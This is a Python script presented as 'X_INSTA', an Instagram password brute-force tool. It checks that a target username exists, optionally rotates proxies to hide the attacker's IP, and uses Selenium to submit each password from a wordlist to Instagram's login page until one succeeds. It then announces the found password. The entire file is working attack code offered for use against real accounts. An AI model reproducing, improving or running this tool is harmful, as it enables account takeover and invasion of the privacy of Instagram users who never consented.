import time
import requests
import sys
import json
import os
import platform
import random
import threading 
import pathlib
import urllib.request
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import selenium
import re



global driver


chromedriver_path = 'chromedriver.exe' # change this to your driver path  
driver = webdriver.Chrome(executable_path=chromedriver_path)
sleep(9)



BLUE, RED, WHITE, YELLOW, GREEN, CYAN, MAGENTA, =('\033[1;34;40m', '\033[1;31;40m', '\033[1;37;40m', '\033[1;33;40m', '\033[1;32;40m', '\033[1;36;40m', '\033[1;35;40m')
os.system('cls')


al = ("\n\n[" + RED + "*" + WHITE + "]" + YELLOW + " X_INSTA " + WHITE + ":" + RED + " Instagram Password Brute Force Tool " + WHITE + "\n\n\n\n\n"  +  " Initializing" + GREEN + "..." + WHITE)
for z in al:
	sys.stdout.write(z)
	sys.stdout.flush()
	time.sleep(00.1)






os.system('cls')
sys.stdout.write(RED + '''

 
	   BY ALDON
██╗  ██╗              ██╗███╗   ██╗███████╗████████╗ █████╗ 
╚██╗██╔╝              ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗
 ╚███╔╝               ██║██╔██╗ ██║███████╗   ██║   ███████║
 ██╔██╗               ██║██║╚██╗██║╚════██║   ██║   ██╔══██║
██╔╝ ██╗███████╗██╗██╗██║██║ ╚████║███████║   ██║   ██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝╚═╝╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝                                                                                                        
''' + '\n\n' + WHITE)


class x_insta(object):

	def __init__(self, username, passwordlist="Passwords.txt"):

		self.username = username
		self.is_Proxy = ''
		self.Proxy_Used = []
		self.passwordlist = passwordlist
		self.user_exits()


		proxy_input = input('\n\n\n[' + RED + '*' + WHITE + ']' + YELLOW + ' Do You Want To Use Proxy? ' + WHITE + '(' + GREEN + 'y' + WHITE + '/' + RED + 'n'  + WHITE + ')' + ': ' + GREEN ).upper()
		if( proxy_input == 'Y' or proxy_input == 'YES'):
			self.choose_proxy()


		elif (proxy_input == 'N' or proxy_input == 'NO'):
			pass


		else:
			sys.exit(RED + "\n\n\nError: Invalid Input \n\n\n" + WHITE )

	









	def choose_proxy(self):

		proxy_f = open("Proxies.txt").read().split('\n')
		proxies = random.choice(proxy_f)


		if not proxies in self.Proxy_Used:
			self.is_Proxy = proxies
			self.Proxy_Used.append(proxies)


		try:

			ip = (GREEN  + '\n\n\n[+]' + WHITE + ' Checking New Public IP Address...\n' + WHITE)
			location = (GREEN  + '\n\n\n[+]' + WHITE + ' Checking New IP Location...\n' + WHITE)



			for i in ip:
				sys.stdout.write(i)
				sys.stdout.flush()
				time.sleep(0.1)

			for locations in location:

				sys.stdout.write(i)
				sys.stdout.flush()
				time.sleep(0.1)



			public_ip = requests.get('http://ip.42.pl/raw').text

			print('\n\n\n' + YELLOW + '[+]' + WHITE + ' Your New Public IP Address is ' + MAGENTA +str(public_ip) + WHITE  + '\n')


			with urllib.request.urlopen("https://geolocation-db.com/json") as url:

				data = json.loads(url.read().decode())

			print('\n\n\n' + YELLOW + '[+]' + WHITE + ' Your New Public IP Location is ' + GREEN + str(data) + WHITE + '\n')




		except Exception as e:


			print(RED + "[-] Error: Can't Reach Websites\n\n\n " + WHITE)
			i_ = input(YELLOW + "Do You Want To Continue The Attack? " + WHITE + '(' + GREEN + 'y' + WHITE + '/' + RED + 'n' + WHITE + ')'  + ": ")
			if (i_ == 'Y' or i_ == 'YES'):
				pass

			elif(i_=='N' or i_ =='NO'):
				sys.exit('\n\n\n')

			else:
				sys.exit(RED + "Error: Invalid Input ")


	def user_exits(self):

		r = requests.get(f'https://www.instagram.com/{self.username}/?__a=1')
		req =(f"https://www.instagram.com/{self.username}")
		if (r.status_code == 404):

			sys.exit(RED + "\n\n\n [-] Error : The User Does Not Exist \n\n\n" + WHITE)


		elif (r.status_code == 200):

			print(WHITE + '\n\n\n[' + GREEN + '+' + WHITE  + "] THE USERNAME" + CYAN +f" {self.username}" + WHITE +  " IS A VALID INSTAGRAM USER " + WHITE + '[' + GREEN + '+' + WHITE + ']\n\n\n\n' +  WHITE + '[' + BLUE + '*' + WHITE + '] ' + GREEN + f"{req} " + WHITE + '[' + BLUE + '*' + WHITE + '] ')

			pass




	def Login(self):

		chrome_options = webdriver.ChromeOptions()
		if len(self.is_Proxy) > 0:

			chrome_options.add_argument(f'--proxy-server={self.is_Proxy}') 

		


		with open(self.passwordlist) as f:
			self.passwords = f.read().split('\n')
			PasswordNumber = len(self.passwords)
			if (PasswordNumber > 0):
				print ( WHITE + '\n\n\n'+'['+ GREEN + '+' + WHITE + ']' + CYAN + f" {PasswordNumber} Passwords Loaded Successfully In The " + WHITE + f"{self.passwordlist}" + CYAN + " File " + WHITE + "[" + GREEN + "+" + WHITE +  "]\n\n\n" )
				
				ask_continue = input(YELLOW + "Do You Want To Continue The Attack? " + WHITE + '(' + GREEN + 'y' + WHITE + '/' + RED + 'n' + WHITE + ')' + ": ")

				if (ask_continue == 'y' or ask_continue == 'Y'):
					os.system('cls')
					pass


				elif(ask_continue =='N' or ask_continue =='n'):
					sys.exit('\n\n\n')

				else:
					sys.exit(RED + "\n\n\nError: Invalid Input \n\n\n ")
					os.system('cls')
			elif (PasswordNumber < 0):

				sys.exit(RED + '\n\n\nPassowrd file is empty, Add Passwords To The File And Try Again\n\n\n' + WHITE)


			else:

				sys.exit(RED + '\n\n\n[-] Error : Please Create A File That Contains Passwords' + WHITE +  ' AND NAME IT:' + GREEN +  ' Passwords.txt ' + RED + '[-]\n\n\n' + WHITE)

		try:
			for line in self.passwords:

				driver.get('https://www.instagram.com/accounts/login/?source=auth_switcher')
				sleep(2)
				username = driver.find_element_by_name('username')
				username.send_keys(self.username)
				password1 = driver.find_element_by_name('password')
				password1.send_keys(line)
				Num = '1'
				pr = (RED + "TRYING" + WHITE + ": " + GREEN + line + '\n\n')
				if len(line) < len(Num) :
					os.system('cls')
					sys.exit(RED + "\n\n\nAll Tried Passwords Are Incorrect " + WHITE + "Try Adding New Ones To The " + GREEN + "Passwords.txt File" + WHITE + '\n\n\n')
				for p in pr:
					sys.stdout.write(p)
					time.sleep(0.1)

				submit = driver.find_element_by_tag_name('form')
				submit.submit()
				sleep(3)
				src = driver.page_source
				text_found = re.search(r'username_hint', src)
				a = repr(text_found)
				

				if not (r'username_hint' in a):

					os.system('cls')

					print(WHITE + '\n[' + CYAN + '+' + WHITE + ']' + WHITE + ' Password Found For User ' + CYAN + f'{self.username}' + WHITE + ' : ' + GREEN + f'{line}\n\n\n\n' + RED + '#HAPPY PWINING ' + WHITE +': ' + CYAN +'ALDON\n\n\n' + WHITE)
					sys.exit(0)
					

				else:
					print(WHITE + '[' + RED + '-' + WHITE + ']' + YELLOW  + " Incorrect Password" + WHITE + " : " +  CYAN + f'{line}' + RED + '\n    [OR OUT OF ATTEMTPS]' + WHITE + '\n_______________________________________________________________________________________________________\n' + WHITE )




		except KeyboardInterrupt:
			ask_exit = str(input(YELLOW + '\n\n\nDo You Want To Stop The Attack ' + WHITE + '(' + RED +'y'+ WHITE + '/' + GREEN + 'n' + WHITE + '): \n\n\n'))
			if(ask_exit == 'Y' or ask_exit == 'YES'):
				print(RED + '[*]' + WHITE +  ' Stopping Threads... \n\n\n')
				exit()
			



xInsta = x_insta(input(CYAN + "[*] " + WHITE + "ENTER A USERNAME " +  CYAN + "[" + YELLOW + "*" + CYAN + "] " + WHITE + ": " + GREEN))

print(WHITE)


try:

	delay = int(input(WHITE + '\n\n\n[' + CYAN + '*' + WHITE + '] Enter Interval Time Delay Between Each Request' + GREEN + ' (in Seconds) ' + WHITE + '[' + GREEN + '*' + WHITE + ']: ' + GREEN ))
	time.sleep(delay)


except Exception as e:
	print( '\n\n\n['+ GREEN + '*' + WHITE + ']' + YELLOW +  ' Using Default Delay Value: '+ BLUE +  '5\n\n\n' + WHITE + '\n\n\n')

	delay = 5


xinstagram = xInsta.Login()
		
























